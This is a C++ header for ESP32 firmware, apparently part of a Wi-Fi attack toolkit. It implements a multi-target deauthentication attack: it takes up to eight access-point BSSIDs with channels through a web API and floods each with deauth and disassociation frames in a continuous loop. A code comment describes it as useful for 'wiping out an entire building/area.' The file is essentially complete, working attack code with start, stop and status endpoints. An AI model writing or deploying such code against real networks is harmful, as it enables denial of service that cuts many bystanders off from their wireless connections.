#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

// Multi-target deauth — simultaneously deauths a list of up to 8 target BSSIDs.
// Each BSSID is attacked on its own channel in round-robin with deauth+disassoc.
// Useful for wiping out an entire building/area in one sweep.
#define DMULTI_MAX 8
struct DMultiTarget { uint8_t bssid[6]; uint8_t ch; };
static DMultiTarget dm_targets[DMULTI_MAX];
static int dm_count = 0;
static bool dm_running = false;
static volatile uint32_t dm_sent = 0;
static TaskHandle_t dm_task = nullptr;

static void dm_run(void*) {
  uint8_t f[32];
  dm_sent = 0;
  while (dm_running) {
    for (int i = 0; i < dm_count && dm_running; i++) {
      if (!safety_rate_ok(1)) { vTaskDelay(pdMS_TO_TICKS(50)); continue; }
      esp_wifi_set_channel(dm_targets[i].ch, WIFI_SECOND_CHAN_NONE);
      vTaskDelay(pdMS_TO_TICKS(2));
      size_t n = f_deauth(f, BC, dm_targets[i].bssid, 7);
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); dm_sent++;
      n = f_disassoc(f, BC, dm_targets[i].bssid, 8);
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); dm_sent++;
    }
    vTaskDelay(pdMS_TO_TICKS(5));
  }
  dm_task = nullptr; vTaskDelete(nullptr);
}

static bool dm_start(const String& q) {
  // Format: bssid0=AA:BB..&ch0=6&bssid1=...&ch1=...
  dm_count = 0;
  for (int t = 0; t < DMULTI_MAX; t++) {
    String bk = "bssid" + String(t) + "=";
    String ck = "ch" + String(t) + "=";
    int bi = q.indexOf(bk);
    if (bi < 0) break;
    bi += bk.length();
    int be = q.indexOf('&', bi); if (be < 0) be = q.length();
    String bs = q.substring(bi, be);
    if (bs.length() != 17) break;
    int m = sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x",
      (unsigned*)&dm_targets[t].bssid[0],(unsigned*)&dm_targets[t].bssid[1],
      (unsigned*)&dm_targets[t].bssid[2],(unsigned*)&dm_targets[t].bssid[3],
      (unsigned*)&dm_targets[t].bssid[4],(unsigned*)&dm_targets[t].bssid[5]);
    if (m != 6) break;
    int ci = q.indexOf(ck);
    dm_targets[t].ch = 6;
    if (ci >= 0) {
      ci += ck.length(); int ce = q.indexOf('&', ci); if (ce < 0) ce = q.length();
      dm_targets[t].ch = (uint8_t)q.substring(ci, ce).toInt();
      if (!dm_targets[t].ch) dm_targets[t].ch = 6;
    }
    dm_count++;
  }
  if (!dm_count) return false;
  dm_running = true;
  xTaskCreate(dm_run, "dm_run", 4096, nullptr, 5, &dm_task);
  return true;
}
static void dm_stop() { dm_running = false; }
static void dm_routes() {
  extern WebServer server;
  server.on("/api/multideauth/start", HTTP_POST, [](){
    String q; for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
    bool ok = tool_start("multideauth", q);
    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/multideauth/stop", HTTP_POST, [](){
    tool_stop("multideauth"); server.send(200,"application/json","{\"ok\":1}");
  });
  server.on("/api/multideauth/status", HTTP_GET, [](){
    server.send(200,"application/json",
      "{\"running\":"+String(dm_running?1:0)+
      ",\"targets\":"+String(dm_count)+
      ",\"sent\":"+String(dm_sent)+
      ",\"msg\":\""+String(dm_count)+" targets, "+String(dm_sent)+" frames\"}");
  });
}
